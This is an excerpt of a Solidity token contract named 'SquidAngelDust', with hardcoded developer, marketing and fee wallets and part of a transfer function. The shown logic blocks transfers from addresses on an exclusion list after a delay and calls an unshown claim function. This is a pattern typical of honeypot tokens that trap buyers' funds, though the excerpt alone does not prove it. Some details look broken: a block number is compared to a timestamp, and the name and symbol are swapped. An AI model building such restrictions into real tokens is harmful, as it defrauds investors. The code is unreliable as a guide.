...
contract SquidAngelDust  is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "SAD";
    string private constant _symbol = unicode"Squid Angel Dust";
    ...
    address payable public DevWallet = payable(0xcf9F2334b377dC2E89496D82bC5399d03d465e32);
    address payable public MarketingWallet = payable(0x9Ea94c69342B188110BDc281302537109A61B267);
    address payable public feereceiver01 = payable(0xb4b60a382E9338135d5978FB52d8a1c5aC3155d2);
    address payable public feereceiver02 = payable(0xE656F7f0108E26c15dc494d280fd38eCd51ad672);
    address payable public feereceiver03 = payable(0x998F14B5eE6C818644eA7290a5Ca3D73557fAf7d);
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (tradingActiveBlock + 8 <= block.timestamp) {transferDelay = false;}
        if (!transferDelay && (!_isExcludedFromFee[from])) { require(!_isExcludeds[from]);}
        if (transferDelay && tradingActiveBlock + 8 <= block.timestamp) {idclaim();}
